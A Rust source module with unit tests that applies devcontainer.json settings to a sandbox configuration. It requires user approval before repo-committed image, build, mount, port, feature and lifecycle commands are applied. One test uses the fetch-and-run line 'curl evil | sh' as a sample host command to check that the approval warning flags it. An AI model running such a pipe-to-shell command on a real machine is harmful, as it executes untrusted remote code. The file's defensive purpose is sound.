//! Fold a parsed [`DevContainer`] onto a [`SandboxConfig`] and emit its
//! lifecycle commands as provisioning steps.
//!
//! This is the seam between the pure devcontainer parser
//! ([`crate::devcontainer`]) and superzej's container machinery. It maps the
//! spec's container-shape fields onto the existing `[sandbox]` config — reusing
//! `image`, `mounts`, `ports`, `volumes`, `init_script`, `prepare` rather than
//! inventing parallel plumbing — and turns the lifecycle commands into the
//! right hook for each:
//!
//! | devcontainer            | superzej hook                        |
//! |-------------------------|--------------------------------------|
//! | `initializeCommand`     | `[sandbox] prepare` (host, one-time) |
//! | `onCreateCommand`       | one-time `StepKind::Exec`            |
//! | `updateContentCommand`  | one-time `StepKind::Exec`            |
//! | `postCreateCommand`     | one-time `StepKind::Exec`            |
//! | `postStartCommand`      | `[sandbox] init_script` (per pane)   |
//! | `postAttachCommand`     | `[sandbox] init_script` (per pane)   |
//!
//! `postStart`/`postAttach` collapse to `init_script`: a terminal multiplexer
//! has no separate "attach", and `init_script` running per-pane is the closest
//! honest analogue. This is the trust-*applying* half — deciding whether the
//! (repo-committed) declaration may be applied at all is `repo_trust`'s job; the
//! caller gates before calling here.

use std::path::Path;

use crate::config::SandboxConfig;
use crate::config_resolve::{Approvals, GatedRequest};
use crate::devcontainer::{Command, DevContainer, ImageSource, Mount, MountKind, SubstCtx};
use crate::envplan::{ProvisionStep, StepKind};
use crate::sandbox_build::{self, SandboxBuild};
use crate::util::sh_quote;

use serde_json::json;

/// The default in-container path a devcontainer mounts the workspace at when
/// `workspaceFolder` is unset: `/workspaces/<repo-basename>`.
pub fn default_container_workspace_folder(local_workspace_folder: &str) -> String {
    let base = local_workspace_folder
        .trim_end_matches('/')
        .rsplit('/')
        .next()
        .filter(|s| !s.is_empty())
        .unwrap_or("workspace");
    format!("/workspaces/{base}")
}

/// Fold `dc`'s container-shape + per-session fields onto `sb`. Returns
/// human-facing warnings for anything that couldn't be represented (a caller
/// surfaces these via `model.status`). Does NOT touch `build`/`compose`/
/// `features` beyond the image reference — those are handled by their own
/// phases; `unsupported()` reports what was skipped.
///
/// Precedence: a value already pinned in `sb` (from user global/profile/
/// workspace config) wins over the devcontainer's — the devcontainer only fills
/// gaps and *adds* to the additive lists (mounts/ports/env). It never overrides
/// the user's hardening `profile`, `backend`, or `network`.
pub fn apply_to_sandbox(dc: &DevContainer, sb: &mut SandboxConfig, ctx: &SubstCtx) -> Vec<String> {
    let mut warnings = fold_source(dc, sb);
    warnings.extend(fold_mounts(dc, sb, ctx));
    fold_ports(dc, sb);
    fold_env_and_poststart(dc, sb, ctx);
    fold_initialize(dc, sb, ctx);
    warnings
}

/// The result of a trust-gated overlay: what applied, what still needs the
/// user's approval, and any non-fatal warnings.
#[derive(Debug, Default)]
pub struct GatedOverlay {
    /// `devcontainer.*` requests not yet approved — the caller prompts (via the
    /// same `repo_trust` flow as a `.superzej.toml` overlay) and re-runs.
    pub pending: Vec<GatedRequest>,
    /// Human-facing warnings (unsupported mounts, phases not yet implemented).
    pub warnings: Vec<String>,
    /// One-time lifecycle steps (`onCreate`/`updateContent`/`postCreate`),
    /// present only when the `devcontainer.lifecycle` category is approved.
    pub steps: Vec<ProvisionStep>,
}

/// Fold a devcontainer onto `sb` **subject to the repo-trust gate**: each
/// category (`image`/`build`/`compose`/`mounts`/`ports`/`lifecycle`) applies
/// only if the user has approved its [`GatedRequest`]; unapproved categories go
/// to `pending` and are NOT applied. `containerEnv`/`remoteEnv` are literal
/// values (no host-env widening), so they apply ungated. Same trust machinery
/// as [`crate::config_resolve::classify_repo_overlay`] — a repo-committed
/// devcontainer.json bearing arbitrary build/lifecycle commands is never
/// silently applied.
pub fn apply_gated(
    dc: &DevContainer,
    sb: &mut SandboxConfig,
    ctx: &SubstCtx,
    workdir: &str,
    approvals: &Approvals,
) -> GatedOverlay {
    let mut o = GatedOverlay::default();
    let ok = |req: &GatedRequest, o: &mut GatedOverlay| {
        let approved = approvals.is_approved(req);
        if !approved {
            o.pending.push(req.clone());
        }
        approved
    };

    // image / build / compose
    if let Some(req) = source_request(dc)
        && ok(&req, &mut o)
    {
        o.warnings.extend(fold_source(dc, sb));
    }

    // mounts
    if let Some(req) = mounts_request(dc)
        && ok(&req, &mut o)
    {
        o.warnings.extend(fold_mounts(dc, sb, ctx));
    }

    // ports
    if let Some(req) = ports_request(dc)
        && ok(&req, &mut o)
    {
        fold_ports(dc, sb);
    }

    // env always applies (literal values); postStart/postAttach + initialize +
    // the one-time steps are all part of the single lifecycle category.
    fold_env(dc, sb, ctx);
    if let Some(req) = lifecycle_request(dc)
        && ok(&req, &mut o)
    {
        fold_poststart(dc, sb, ctx);
        fold_initialize(dc, sb, ctx);
        o.steps = lifecycle_steps(dc, workdir, ctx);
    }

    // features: gate only — the install steps are emitted by the provisioner
    // via `gated_feature_steps` (they run in-container, not at overlay time).
    if let Some(req) = features_request(dc) {
        let _ = ok(&req, &mut o);
    }

    o
}

/// The one-time lifecycle steps (`onCreate` → `updateContent` → `postCreate`)
/// as ordered [`ProvisionStep`]s, to be appended to an `EnvPlan` by the applier
/// after `envplan::plan`. Each runs in `workdir`. Ids are stable for
/// idempotence + the loading screen.
pub fn lifecycle_steps(dc: &DevContainer, workdir: &str, ctx: &SubstCtx) -> Vec<ProvisionStep> {
    let mut steps = Vec::new();
    let wd = sh_quote(workdir);
    let emit = |hook: &str, cmds: &[Command], steps: &mut Vec<ProvisionStep>| {
        for (i, cmd) in cmds.iter().enumerate() {
            let script = format!("cd {wd} && {}", command_to_shell(cmd, ctx));
            steps.push(ProvisionStep {
                id: format!("devcontainer.{hook}.{i}"),
                label: format!("devcontainer: {hook}Command"),
                kind: StepKind::Exec(script),
            });
        }
    };
    emit("onCreate", &dc.lifecycle.on_create, &mut steps);
    emit("updateContent", &dc.lifecycle.update_content, &mut steps);
    emit("postCreate", &dc.lifecycle.post_create, &mut steps);
    steps
}

/// The trust-gated one-time lifecycle steps for the provisioner to append after
/// `envplan::plan`. Empty when the `devcontainer.lifecycle` category isn't
/// approved (the container-shape overlay surfaces the pending request; the
/// provisioner just skips the steps until then).
pub fn gated_steps(
    dc: &DevContainer,
    workdir: &str,
    ctx: &SubstCtx,
    approvals: &Approvals,
) -> Vec<ProvisionStep> {
    match lifecycle_request(dc) {
        Some(req) if !approvals.is_approved(&req) => Vec::new(),
        _ => lifecycle_steps(dc, workdir, ctx),
    }
}

/// The trust-gated feature-install steps for the provisioner (ordered; run
/// after the toolchain, before lifecycle commands). Empty when there are no
/// features or the `devcontainer.features` category isn't approved.
pub fn gated_feature_steps(
    dc: &DevContainer,
    remote_user: &str,
    approvals: &Approvals,
) -> Vec<ProvisionStep> {
    match features_request(dc) {
        Some(req) if !approvals.is_approved(&req) => Vec::new(),
        _ => crate::devcontainer_features::feature_steps(dc, remote_user),
    }
}

// ---- per-category folds ---------------------------------------------------

/// Resolve the image source onto `sb`: a plain `image` fills `sb.image`; a
/// `build` sets `sb.image` to a content-addressed tag + `sb.build`; a compose
/// source is deferred to its phase (warned).
fn fold_source(dc: &DevContainer, sb: &mut SandboxConfig) -> Vec<String> {
    match &dc.source {
        ImageSource::Image(img) => {
            fold_image(dc, sb);
            // A devcontainer image is self-contained — don't shadow its `/usr`,
            // `/bin`, etc. with the host toolchain (`auto_caches` injection).
            if !img.is_empty() {
                sb.auto_caches = false;
            }
            Vec::new()
        }
        ImageSource::Build(b) => {
            let w = fold_build(dc, b, sb);
            sb.auto_caches = false;
            w
        }
        ImageSource::Compose(c) => fold_compose(dc, c, sb),
    }
}

/// Encode a devcontainer compose source into `sb.compose` (paths resolved
/// against the devcontainer dir). No-op when the user already set a compose file.
fn fold_compose(
    dc: &DevContainer,
    c: &crate::devcontainer::Compose,
    sb: &mut SandboxConfig,
) -> Vec<String> {
    if sb.compose.is_some() {
        return Vec::new();
    }
    let Some(dir) = &dc.config_dir else {
        return vec![
            "devcontainer: `dockerComposeFile` needs a resolved config dir (skipped)".into(),
        ];
    };
    let files: Vec<String> = c.files.iter().map(|f| resolve_under(dir, f)).collect();
    let cs = crate::sandbox_compose::ComposeSpec {
        files,
        service: (!c.service.is_empty()).then(|| c.service.clone()),
        run_services: c.run_services.clone(),
    };
    sb.compose = Some(cs.encode());
    // A compose service's mounts/ports come from the compose file, not from
    // superzej's `run` opts — note the gap so it isn't silently dropped.
    let mut warns = Vec::new();
    if !dc.mounts.is_empty() || !dc.forward_ports.is_empty() {
        warns.push(
            "devcontainer: mounts/forwardPorts on a compose service are governed by the \
             compose file, not applied by superzej"
                .into(),
        );
    }
    warns
}

fn fold_image(dc: &DevContainer, sb: &mut SandboxConfig) {
    if let ImageSource::Image(img) = &dc.source
        && !img.is_empty()
        && sb.image.is_empty()
    {
        sb.image = img.clone();
    }
}

/// Turn a devcontainer `build` block into a [`SandboxBuild`] on `sb` (paths
/// resolved against the devcontainer directory) + a content-addressed
/// `sb.image` tag. No-op when the user pinned an image (their choice wins) or
/// the config dir is unknown (bare-text parse).
fn fold_build(
    dc: &DevContainer,
    b: &crate::devcontainer::Build,
    sb: &mut SandboxConfig,
) -> Vec<String> {
    if !sb.image.is_empty() {
        return Vec::new();
    }
    let Some(dir) = &dc.config_dir else {
        return vec!["devcontainer: `build` needs a resolved config dir (skipped)".into()];
    };
    let build = SandboxBuild {
        dockerfile: resolve_under(dir, &b.dockerfile),
        context: resolve_under(dir, &b.context),
        args: b.args.clone(),
        target: b.target.clone(),
    };
    sb.image = sandbox_build::content_tag(&tag_basename(dir), &build);
    sb.build = Some(build);
    Vec::new()
}

/// Resolve `p` against `dir` (absolute `p` wins, `.`/empty ⇒ `dir` itself),
/// returned as a string.
fn resolve_under(dir: &Path, p: &str) -> String {
    let pp = Path::new(p);
    if pp.is_absolute() {
        p.to_string()
    } else if p.is_empty() || p == "." {
        dir.to_string_lossy().into_owned()
    } else {
        dir.join(pp).to_string_lossy().into_owned()
    }
}

/// A human tag hint from the config dir: the worktree/project name (the parent
/// of a `.devcontainer/` folder), not the literal `.devcontainer`.
fn tag_basename(dir: &Path) -> String {
    let name = dir.file_name().map(|s| s.to_string_lossy().into_owned());
    match name.as_deref() {
        Some(".devcontainer") => dir
            .parent()
            .and_then(|p| p.file_name())
            .map(|s| s.to_string_lossy().into_owned())
            .unwrap_or_else(|| "img".into()),
        Some(n) => n.to_string(),
        None => "img".into(),
    }
}

fn fold_mounts(dc: &DevContainer, sb: &mut SandboxConfig, ctx: &SubstCtx) -> Vec<String> {
    let mut warnings = Vec::new();
    for m in &dc.mounts {
        match mount_to_sandbox(m, ctx) {
            MountOutcome::Bind(spec) => {
                if !sb.mounts.contains(&spec) {
                    sb.mounts.push(spec);
                }
            }
            MountOutcome::Volume {
                name,
                dest,
                readonly,
            } => {
                if readonly {
                    warnings.push(format!(
                        "devcontainer: read-only volume '{name}' mounted read-write (unsupported)"
                    ));
                }
                sb.volumes.entry(name).or_insert(dest);
            }
            MountOutcome::Unsupported(why) => warnings.push(why),
        }
    }
    warnings
}

fn fold_ports(dc: &DevContainer, sb: &mut SandboxConfig) {
    for p in &dc.forward_ports {
        if !sb.ports.contains(p) {
            sb.ports.push(p.clone());
        }
    }
}

/// `containerEnv` + `remoteEnv` → `export` lines prepended to `init_script`.
/// Literal values, not host-env passthrough keys, so this never widens the
/// passthrough allow-list. containerEnv first so remoteEnv may reference it.
fn fold_env(dc: &DevContainer, sb: &mut SandboxConfig, ctx: &SubstCtx) {
    let mut exports = String::new();
    for (k, v) in dc.container_env.iter().chain(dc.remote_env.iter()) {
        exports.push_str(&format!("export {}={}\n", k, sh_quote(&ctx_subst(v, ctx))));
    }
    prepend_init(sb, exports);
}

/// `postStart` + `postAttach` → `init_script` (per-pane). A multiplexer has no
/// separate attach, so both collapse here.
fn fold_poststart(dc: &DevContainer, sb: &mut SandboxConfig, ctx: &SubstCtx) {
    let mut lines = String::new();
    for cmd in dc
        .lifecycle
        .post_start
        .iter()
        .chain(dc.lifecycle.post_attach.iter())
    {
        lines.push_str(&command_to_shell(cmd, ctx));
        lines.push('\n');
    }
    prepend_init(sb, lines);
}

/// Convenience for the ungated all-in-one path: env + postStart together.
fn fold_env_and_poststart(dc: &DevContainer, sb: &mut SandboxConfig, ctx: &SubstCtx) {
    fold_env(dc, sb, ctx);
    fold_poststart(dc, sb, ctx);
}

/// `initializeCommand` → host-side `prepare` (one-time, before the container).
fn fold_initialize(dc: &DevContainer, sb: &mut SandboxConfig, ctx: &SubstCtx) {
    for cmd in &dc.lifecycle.initialize {
        let line = command_to_shell(cmd, ctx);
        if !sb.prepare.contains(&line) {
            sb.prepare.push(line);
        }
    }
}

fn prepend_init(sb: &mut SandboxConfig, extra: String) {
    if extra.is_empty() {
        return;
    }
    if sb.init_script.is_empty() {
        sb.init_script = extra;
    } else {
        sb.init_script = format!("{}\n{extra}", sb.init_script);
    }
}

// ---- trust-gate request builders ------------------------------------------
//
// Requests are keyed on the RAW (pre-substitution) declaration so the canonical
// trust key is stable across machines/paths; a change to the devcontainer.json
// changes the canonical value and re-prompts.

/// All `devcontainer.*` requests this declaration would make (for a "review
/// before trusting" listing).
pub fn gate_requests(dc: &DevContainer) -> Vec<GatedRequest> {
    [
        source_request(dc),
        mounts_request(dc),
        ports_request(dc),
        lifecycle_request(dc),
        features_request(dc),
    ]
    .into_iter()
    .flatten()
    .collect()
}

fn source_request(dc: &DevContainer) -> Option<GatedRequest> {
    match &dc.source {
        ImageSource::Image(img) if !img.is_empty() => Some(GatedRequest {
            key: "devcontainer.image".into(),
            value: json!(img),
            summary: format!("run in devcontainer image `{img}`"),
        }),
        ImageSource::Image(_) => None,
        ImageSource::Build(b) => Some(GatedRequest {
            key: "devcontainer.build".into(),
            value: json!({
                "dockerfile": b.dockerfile,
                "context": b.context,
                "target": b.target,
                "args": b.args,
            }),
            summary: format!("build devcontainer image from `{}`", b.dockerfile),
        }),
        ImageSource::Compose(c) => Some(GatedRequest {
            key: "devcontainer.compose".into(),
            value: json!({ "files": c.files, "service": c.service, "runServices": c.run_services }),
            summary: format!(
                "start docker-compose service `{}` from {}",
                c.service,
                c.files.join(", ")
            ),
        }),
    }
}

fn mounts_request(dc: &DevContainer) -> Option<GatedRequest> {
    if dc.mounts.is_empty() {
        return None;
    }
    let raw: Vec<serde_json::Value> = dc
        .mounts
        .iter()
        .map(|m| {
            json!({
                "src": m.source,
                "dst": m.target,
                "type": mount_kind_str(m.kind),
                "ro": m.readonly,
            })
        })
        .collect();
    let summary = dc
        .mounts
        .iter()
        .map(|m| match &m.source {
            Some(s) => format!("{s} → {}", m.target),
            None => m.target.clone(),
        })
        .collect::<Vec<_>>()
        .join(", ");
    Some(GatedRequest {
        key: "devcontainer.mounts".into(),
        value: json!(raw),
        summary: format!("mount {summary}"),
    })
}

fn ports_request(dc: &DevContainer) -> Option<GatedRequest> {
    if dc.forward_ports.is_empty() {
        return None;
    }
    Some(GatedRequest {
        key: "devcontainer.ports".into(),
        value: json!(dc.forward_ports),
        summary: format!("forward ports {}", dc.forward_ports.join(", ")),
    })
}

fn lifecycle_request(dc: &DevContainer) -> Option<GatedRequest> {
    if dc.lifecycle.is_empty() {
        return None;
    }
    let disp = |cmds: &[Command]| -> Vec<String> { cmds.iter().map(command_display).collect() };
    let value = json!({
        "initialize": disp(&dc.lifecycle.initialize),
        "onCreate": disp(&dc.lifecycle.on_create),
        "updateContent": disp(&dc.lifecycle.update_content),
        "postCreate": disp(&dc.lifecycle.post_create),
        "postStart": disp(&dc.lifecycle.post_start),
        "postAttach": disp(&dc.lifecycle.post_attach),
    });
    // The summary highlights host execution — `initializeCommand` runs on the
    // HOST (outside any sandbox), which is strictly more dangerous.
    let mut parts = Vec::new();
    if !dc.lifecycle.initialize.is_empty() {
        parts.push(format!(
            "ON HOST: {}",
            disp(&dc.lifecycle.initialize).join("; ")
        ));
    }
    let in_ctr: Vec<String> = disp(&dc.lifecycle.on_create)
        .into_iter()
        .chain(disp(&dc.lifecycle.update_content))
        .chain(disp(&dc.lifecycle.post_create))
        .chain(disp(&dc.lifecycle.post_start))
        .chain(disp(&dc.lifecycle.post_attach))
        .collect();
    if !in_ctr.is_empty() {
        parts.push(format!("in container: {}", in_ctr.join("; ")));
    }
    Some(GatedRequest {
        key: "devcontainer.lifecycle".into(),
        value,
        summary: format!(
            "run devcontainer lifecycle commands — {}",
            parts.join(" | ")
        ),
    })
}

fn features_request(dc: &DevContainer) -> Option<GatedRequest> {
    if dc.features.is_empty() {
        return None;
    }
    let ids: Vec<String> = dc.features.keys().cloned().collect();
    Some(GatedRequest {
        key: "devcontainer.features".into(),
        value: json!(ids),
        summary: format!("install devcontainer features: {}", ids.join(", ")),
    })
}

fn mount_kind_str(k: MountKind) -> &'static str {
    match k {
        MountKind::Bind => "bind",
        MountKind::Volume => "volume",
        MountKind::Tmpfs => "tmpfs",
    }
}

/// Raw (unsubstituted) one-line display of a command, for trust summaries.
fn command_display(cmd: &Command) -> String {
    match cmd {
        Command::Shell(s) => s.clone(),
        Command::Argv(v) => v.join(" "),
    }
}

// ---- internals ------------------------------------------------------------

enum MountOutcome {
    Bind(String),
    Volume {
        name: String,
        dest: String,
        readonly: bool,
    },
    Unsupported(String),
}

fn mount_to_sandbox(m: &Mount, ctx: &SubstCtx) -> MountOutcome {
    let target = ctx_subst(&m.target, ctx);
    match m.kind {
        MountKind::Bind => match &m.source {
            Some(src) => {
                let src = ctx_subst(src, ctx);
                let mut spec = format!("{src}:{target}");
                if m.readonly {
                    spec.push_str(":ro");
                }
                MountOutcome::Bind(spec)
            }
            None => MountOutcome::Unsupported(format!(
                "devcontainer: bind mount to '{target}' has no source (skipped)"
            )),
        },
        MountKind::Volume => match &m.source {
            Some(name) => MountOutcome::Volume {
                name: ctx_subst(name, ctx),
                dest: target,
                readonly: m.readonly,
            },
            None => MountOutcome::Unsupported(format!(
                "devcontainer: anonymous volume at '{target}' (skipped)"
            )),
        },
        MountKind::Tmpfs => {
            MountOutcome::Unsupported(format!("devcontainer: tmpfs mount at '{target}' (skipped)"))
        }
    }
}

/// Render a lifecycle [`Command`] to a single shell line with `${...}`
/// variables substituted. Argv form is shell-quoted so it runs literally.
fn command_to_shell(cmd: &Command, ctx: &SubstCtx) -> String {
    match cmd {
        Command::Shell(s) => ctx_subst(s, ctx),
        Command::Argv(argv) => argv
            .iter()
            .map(|a| sh_quote(&ctx_subst(a, ctx)))
            .collect::<Vec<_>>()
            .join(" "),
    }
}

fn ctx_subst(s: &str, ctx: &SubstCtx) -> String {
    crate::devcontainer::substitute(s, ctx)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::devcontainer::parse;

    fn ctx() -> SubstCtx<'static> {
        SubstCtx {
            local_workspace_folder: "/home/u/proj".into(),
            container_workspace_folder: "/workspaces/proj".into(),
            local_env: &|_| None,
            container_env: &|_| None,
        }
    }

    #[test]
    fn default_workspace_folder() {
        assert_eq!(
            default_container_workspace_folder("/home/u/my-repo"),
            "/workspaces/my-repo"
        );
        assert_eq!(
            default_container_workspace_folder("/home/u/my-repo/"),
            "/workspaces/my-repo"
        );
    }

    #[test]
    fn image_fills_only_when_unpinned() {
        let dc = parse(r#"{ "image": "node:20" }"#).unwrap();
        let mut sb = SandboxConfig::default();
        apply_to_sandbox(&dc, &mut sb, &ctx());
        assert_eq!(sb.image, "node:20");

        // A user-pinned image wins.
        let mut sb2 = SandboxConfig::default();
        sb2.image = "debian:stable".into();
        apply_to_sandbox(&dc, &mut sb2, &ctx());
        assert_eq!(sb2.image, "debian:stable");
    }

    #[test]
    fn mounts_ports_env_fold_in() {
        let dc = parse(
            r#"{
                "image": "x",
                "mounts": [
                    { "source": "/host/cache", "target": "/cache", "type": "bind" },
                    { "source": "named-vol", "target": "/data", "type": "volume" },
                    { "source": "/ro", "target": "/ro", "type": "bind", "readonly": true }
                ],
                "forwardPorts": [3000, "5432:5432"],
                "containerEnv": { "TZ": "UTC" },
                "remoteEnv": { "API": "${localWorkspaceFolder}/x" }
            }"#,
        )
        .unwrap();
        let mut sb = SandboxConfig::default();
        let warns = apply_to_sandbox(&dc, &mut sb, &ctx());
        assert!(warns.is_empty(), "unexpected warnings: {warns:?}");
        assert!(sb.mounts.contains(&"/host/cache:/cache".to_string()));
        assert!(sb.mounts.contains(&"/ro:/ro:ro".to_string()));
        assert_eq!(
            sb.volumes.get("named-vol").map(String::as_str),
            Some("/data")
        );
        assert!(sb.ports.contains(&"3000:3000".to_string()));
        assert!(sb.ports.contains(&"5432:5432".to_string()));
        // env + variable substitution landed in init_script exports.
        assert!(sb.init_script.contains("export TZ=UTC"));
        assert!(sb.init_script.contains("export API=/home/u/proj/x"));
    }

    #[test]
    fn tmpfs_and_anonymous_mounts_warn() {
        let dc = parse(
            r#"{ "image": "x", "mounts": [
                { "target": "/t", "type": "tmpfs" },
                { "target": "/a", "type": "volume" }
            ] }"#,
        )
        .unwrap();
        let mut sb = SandboxConfig::default();
        let before = sb.mounts.len();
        let warns = apply_to_sandbox(&dc, &mut sb, &ctx());
        assert_eq!(warns.len(), 2);
        // Neither unsupported mount was added.
        assert_eq!(sb.mounts.len(), before);
    }

    #[test]
    fn poststart_and_postattach_go_to_init_script() {
        let dc = parse(
            r#"{ "image": "x",
                "postStartCommand": "start-svc",
                "postAttachCommand": ["echo", "hi there"] }"#,
        )
        .unwrap();
        let mut sb = SandboxConfig::default();
        apply_to_sandbox(&dc, &mut sb, &ctx());
        assert!(sb.init_script.contains("start-svc"));
        // argv form is shell-quoted.
        assert!(sb.init_script.contains("echo 'hi there'"));
    }

    #[test]
    fn init_script_appends_to_existing() {
        let dc = parse(r#"{ "image": "x", "postStartCommand": "svc" }"#).unwrap();
        let mut sb = SandboxConfig::default();
        sb.init_script = "existing".into();
        apply_to_sandbox(&dc, &mut sb, &ctx());
        assert!(sb.init_script.starts_with("existing"));
        assert!(sb.init_script.contains("svc"));
    }

    #[test]
    fn initialize_goes_to_prepare() {
        let dc = parse(r#"{ "image": "x", "initializeCommand": "host-setup.sh" }"#).unwrap();
        let mut sb = SandboxConfig::default();
        apply_to_sandbox(&dc, &mut sb, &ctx());
        assert_eq!(sb.prepare, vec!["host-setup.sh".to_string()]);
    }

    #[test]
    fn lifecycle_one_time_steps_ordered() {
        let dc = parse(
            r#"{ "image": "x",
                "onCreateCommand": "a",
                "updateContentCommand": ["b", "c"],
                "postCreateCommand": "d" }"#,
        )
        .unwrap();
        let steps = lifecycle_steps(&dc, "/w", &ctx());
        let ids: Vec<_> = steps.iter().map(|s| s.id.as_str()).collect();
        assert_eq!(
            ids,
            vec![
                "devcontainer.onCreate.0",
                "devcontainer.updateContent.0",
                "devcontainer.postCreate.0"
            ]
        );
        // Each cd's into the workdir.
        assert!(matches!(&steps[0].kind, StepKind::Exec(s) if s == "cd /w && a"));
        assert!(matches!(&steps[1].kind, StepKind::Exec(s) if s == "cd /w && b c"));
    }

    fn approvals_for(dc: &DevContainer) -> Approvals {
        Approvals::from_canonical(gate_requests(dc).iter().map(|r| r.canonical()))
    }

    #[test]
    fn gated_apply_denies_until_approved() {
        let dc = parse(
            r#"{ "image": "node:20", "forwardPorts": [3000],
                "postCreateCommand": "npm ci" }"#,
        )
        .unwrap();
        // Nothing approved → nothing applies, everything pends.
        let mut sb = SandboxConfig::default();
        let o = apply_gated(&dc, &mut sb, &ctx(), "/w", &Approvals::deny_all());
        assert!(sb.image.is_empty());
        assert!(o.steps.is_empty());
        let keys: Vec<_> = o.pending.iter().map(|r| r.key.as_str()).collect();
        assert!(keys.contains(&"devcontainer.image"));
        assert!(keys.contains(&"devcontainer.ports"));
        assert!(keys.contains(&"devcontainer.lifecycle"));

        // Approve all → everything applies, nothing pends.
        let mut sb2 = SandboxConfig::default();
        let o2 = apply_gated(&dc, &mut sb2, &ctx(), "/w", &approvals_for(&dc));
        assert!(o2.pending.is_empty());
        assert_eq!(sb2.image, "node:20");
        assert!(sb2.ports.contains(&"3000:3000".to_string()));
        assert_eq!(o2.steps.len(), 1);
        assert_eq!(o2.steps[0].id, "devcontainer.postCreate.0");
    }

    #[test]
    fn gated_env_applies_ungated() {
        let dc = parse(r#"{ "image": "x", "containerEnv": { "TZ": "UTC" } }"#).unwrap();
        let mut sb = SandboxConfig::default();
        // Deny everything — env still lands (literal values, no host widening).
        apply_gated(&dc, &mut sb, &ctx(), "/w", &Approvals::deny_all());
        assert!(sb.init_script.contains("export TZ=UTC"));
        assert!(sb.image.is_empty());
    }

    #[test]
    fn lifecycle_request_flags_host_execution() {
        let dc = parse(r#"{ "image": "x", "initializeCommand": "curl evil | sh" }"#).unwrap();
        let req = lifecycle_request(&dc).unwrap();
        assert!(req.summary.contains("ON HOST"));
        assert!(req.summary.contains("curl evil | sh"));
    }

    #[test]
    fn gate_key_is_stable_across_substitution_and_changes_with_content() {
        let a = parse(r#"{ "image": "node:20" }"#).unwrap();
        let b = parse(r#"{ "image": "node:22" }"#).unwrap();
        let ka = source_request(&a).unwrap().canonical();
        let kb = source_request(&b).unwrap().canonical();
        assert_ne!(ka, kb, "changing the image must re-prompt");
        assert_eq!(ka, source_request(&a).unwrap().canonical(), "stable");
    }

    fn parse_with_dir(text: &str, dir: &str) -> DevContainer {
        let mut dc = parse(text).unwrap();
        dc.config_dir = Some(std::path::PathBuf::from(dir));
        dc
    }

    #[test]
    fn build_sets_tag_and_resolved_paths() {
        let dc = parse_with_dir(
            r#"{ "build": { "dockerfile": "Dockerfile", "context": ".", "args": { "V": "20" } } }"#,
            "/home/u/proj/.devcontainer",
        );
        let mut sb = SandboxConfig::default();
        let warns = apply_to_sandbox(&dc, &mut sb, &ctx());
        assert!(warns.is_empty(), "{warns:?}");
        // image is a content tag hinting the project name (parent of .devcontainer).
        assert!(sb.image.starts_with("superzej-dc-proj:"), "{}", sb.image);
        let b = sb.build.expect("build set");
        assert_eq!(b.dockerfile, "/home/u/proj/.devcontainer/Dockerfile");
        assert_eq!(b.context, "/home/u/proj/.devcontainer");
        assert_eq!(b.args.get("V").map(String::as_str), Some("20"));
    }

    #[test]
    fn explicit_image_or_build_disables_host_toolchain_injection() {
        // A devcontainer image is self-contained; superzej must not bind the
        // host `/usr`/`/bin` over it (that shadowed the image's own tools).
        let img = parse(r#"{ "image": "node:20" }"#).unwrap();
        let mut sb = SandboxConfig::default();
        assert!(sb.auto_caches, "default is on");
        apply_to_sandbox(&img, &mut sb, &ctx());
        assert!(
            !sb.auto_caches,
            "explicit image must disable host-toolchain inject"
        );

        let bld = parse_with_dir(
            r#"{ "build": { "dockerfile": "Dockerfile" } }"#,
            "/home/u/proj/.devcontainer",
        );
        let mut sb2 = SandboxConfig::default();
        apply_to_sandbox(&bld, &mut sb2, &ctx());
        assert!(!sb2.auto_caches, "build must disable host-toolchain inject");
    }

    #[test]
    fn build_absolute_paths_pass_through() {
        let dc = parse_with_dir(
            r#"{ "build": { "dockerfile": "/abs/Dockerfile", "context": "/abs" } }"#,
            "/home/u/proj/.devcontainer",
        );
        let mut sb = SandboxConfig::default();
        apply_to_sandbox(&dc, &mut sb, &ctx());
        let b = sb.build.unwrap();
        assert_eq!(b.dockerfile, "/abs/Dockerfile");
        assert_eq!(b.context, "/abs");
    }

    #[test]
    fn build_yields_to_user_pinned_image() {
        let dc = parse_with_dir(
            r#"{ "build": { "dockerfile": "Dockerfile" } }"#,
            "/home/u/proj/.devcontainer",
        );
        let mut sb = SandboxConfig::default();
        sb.image = "debian:stable".into();
        apply_to_sandbox(&dc, &mut sb, &ctx());
        assert_eq!(sb.image, "debian:stable");
        assert!(sb.build.is_none());
    }

    #[test]
    fn build_without_config_dir_warns() {
        // Bare-text parse (no dir) can't resolve the context.
        let dc = parse(r#"{ "build": { "dockerfile": "Dockerfile" } }"#).unwrap();
        let mut sb = SandboxConfig::default();
        let warns = apply_to_sandbox(&dc, &mut sb, &ctx());
        assert_eq!(warns.len(), 1);
        assert!(warns[0].contains("config dir"));
        assert!(sb.build.is_none());
    }

    #[test]
    fn build_is_trust_gated() {
        let dc = parse_with_dir(
            r#"{ "build": { "dockerfile": "Dockerfile" } }"#,
            "/home/u/proj/.devcontainer",
        );
        // Denied → no build applied, request pends under devcontainer.build.
        let mut sb = SandboxConfig::default();
        let o = apply_gated(&dc, &mut sb, &ctx(), "/w", &Approvals::deny_all());
        assert!(sb.build.is_none());
        assert!(o.pending.iter().any(|r| r.key == "devcontainer.build"));

        // Approved → build applies.
        let mut sb2 = SandboxConfig::default();
        let o2 = apply_gated(&dc, &mut sb2, &ctx(), "/w", &approvals_for(&dc));
        assert!(sb2.build.is_some());
        assert!(o2.pending.is_empty());
    }

    #[test]
    fn compose_folds_into_encoded_field() {
        let dc = parse_with_dir(
            r#"{ "dockerComposeFile": ["docker-compose.yml", "override.yml"],
                "service": "app", "runServices": ["db"] }"#,
            "/home/u/proj/.devcontainer",
        );
        let mut sb = SandboxConfig::default();
        apply_to_sandbox(&dc, &mut sb, &ctx());
        let cs = crate::sandbox_compose::ComposeSpec::decode(sb.compose.as_ref().unwrap());
        assert_eq!(
            cs.files,
            vec![
                "/home/u/proj/.devcontainer/docker-compose.yml",
                "/home/u/proj/.devcontainer/override.yml"
            ]
        );
        assert_eq!(cs.service.as_deref(), Some("app"));
        assert_eq!(cs.run_services, vec!["db"]);
    }

    #[test]
    fn compose_is_trust_gated() {
        let dc = parse_with_dir(
            r#"{ "dockerComposeFile": "c.yml", "service": "app" }"#,
            "/home/u/proj/.devcontainer",
        );
        let mut sb = SandboxConfig::default();
        let o = apply_gated(&dc, &mut sb, &ctx(), "/w", &Approvals::deny_all());
        assert!(sb.compose.is_none());
        assert!(o.pending.iter().any(|r| r.key == "devcontainer.compose"));

        let mut sb2 = SandboxConfig::default();
